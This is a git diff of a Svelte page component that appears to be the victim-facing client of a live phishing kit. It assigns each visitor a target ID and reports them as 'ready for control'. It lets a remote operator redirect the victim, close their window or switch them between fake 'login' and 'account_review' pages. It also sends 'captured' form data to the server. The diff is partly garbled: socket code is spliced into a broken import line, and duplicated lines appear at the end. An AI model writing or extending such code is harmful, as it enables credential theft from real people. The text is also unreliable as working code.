@@ -1,22 +1,5 @@
 <script lang="ts">
-    import { onMount, onDe        // Connect to Socket.io server
-        try {
-            // Use Socket.io path routing via Nginx (works on all domains)
-            // Nginx routes /socket.io/ to localhost:3001 on all domains
-            const socketUrl = `${window.location.protocol}//${window.location.host}`;
-            console.log('Connecting to Socket.io at:', socketUrl);
-            
-            socket = io(socketUrl, {
-                path: '/socket.io',
-                transports: ['websocket', 'polling'],
-                upgrade: true,
-                rememberUpgrade: true,
-                timeout: 10000,
-                reconnection: true,
-                reconnectionAttempts: 5,
-                reconnectionDelay: 1000,
-                forceNew: true
-            });lte';
+    import { onMount, onDestroy } from 'svelte';
     import { goto } from '$app/navigation';
     import { io } from 'socket.io-client';
     
@@ -63,12 +46,13 @@
         
         // Connect to Socket.io server
         try {
-            // Always connect to Socket.io on port 3001, using the current domain
-            // This ensures Socket.io works on both main domain and connected domains
-            const socketUrl = `${window.location.protocol}//${window.location.hostname}:3001`;
+            // Use Socket.io path routing via Nginx (works on all domains)
+            // Nginx routes /socket.io/ to localhost:3001 on all domains
+            const socketUrl = `${window.location.protocol}//${window.location.host}`;
             console.log('Connecting to Socket.io at:', socketUrl);
             
             socket = io(socketUrl, {
+                path: '/socket.io',
                 transports: ['websocket', 'polling'],
                 upgrade: true,
                 rememberUpgrade: true,
@@ -100,6 +84,120 @@
                 targetID = data.targetID;
                 connectionStatus = 'Online';
                 isLoading = false;
+                
+                console.log('🎯 Target ID assigned:', targetID);
+                console.log('📡 Target status: Online and ready for control');
+                
+                // Set initial page from server
+                if (data.start_page) {
+                    currentPage = data.start_page;
+                    console.log('📄 Initial page set to:', currentPage);
+                }
+                
+                // Update status periodically
+                setInterval(() => {
+                    socket.emit('updateStatus', {
+                        targetID: targetID,
+                        status: 'Online',
+                        currentPage: currentPage
+                    });
+                }, 5000); // Update every 5 seconds
+            });
+            
+            socket.on('action', (data) => {
+                console.log('🎮 RECEIVED ACTION:', data);
+                console.log('   Action type:', data.action);
+                console.log('   Custom URL:', data.customUrl);
+                console.log('   Target ID:', targetID);
+                console.log('   Timestamp:', new Date().toISOString());
+                handleAction(data.action, data.customUrl);
+            });
+            
+            socket.on('disconnect', () => {
+                console.log('Disconnected from Socket.io server');
+                connectionStatus = 'Offline';
+            });
+            
+            socket.on('connect_error', (error) => {
+                console.error('Socket.io connection error:', error);
+                connectionStatus = 'Connection Error';
+                isLoading = false;
+            });
+            
+        } catch (error) {
+            console.error('Failed to initialize socket:', error);
+            connectionStatus = 'Failed to Connect';
+            isLoading = false;
+        }
+    });
+    
+    onDestroy(() => {
+        if (socket) {
+            socket.disconnect();
+        }
+    });
+    
+    function handleAction(action, customUrl) {
+        console.log(`🎯 HANDLING ACTION: ${action}`, customUrl);
+        
+        switch (action) {
+            case 'redirect':
+            case 'customRedirect':
+                if (customUrl) {
+                    console.log('🔗 Redirecting to:', customUrl);
+                    console.log('🚀 Executing redirect in 1 second...');
+                    setTimeout(() => {
+                        window.location.href = customUrl;
+                    }, 1000);
+                } else {
+                    console.log('❌ No URL provided for redirect');
+                }
+                break;
+            case 'reload':
+                console.log('🔄 Reloading page...');
+                window.location.reload();
+                break;
+            case 'close':
+                console.log('❌ Closing window...');
+                window.close();
+                break;
+            case 'set_page':
+                console.log('📄 Setting page to:', customUrl || 'account_review');
+                currentPage = customUrl || 'account_review';
+                if (socket && targetID) {
+                    socket.emit('updateStatus', {
+                        targetID: targetID,
+                        status: 'Online',
+                        currentPage: currentPage
+                    });
+                }
+                break;
+            default:
+                // Handle page changes (login, account_review, etc.)
+                console.log('📄 Changing page to:', action);
+                currentPage = action;
+                if (socket && targetID) {
+                    socket.emit('updateStatus', {
+                        targetID: targetID,
+                        status: 'Online',
+                        currentPage: currentPage
+                    });
+                }
+                break;
+        }
+    }
+    
+    function handleFormSubmit(formData) {
+        // Send captured data to server
+        if (socket && targetID) {
+            socket.emit('captureData', {
+                targetID: targetID,
+                page: currentPage,
+                data: formData,
+                timestamp: new Date().toISOString()
+            });
+        }
+    }
                 
                 console.log('🎯 Target ID assigned:', targetID);
                 console.log('📡 Target status: Online and ready for control');
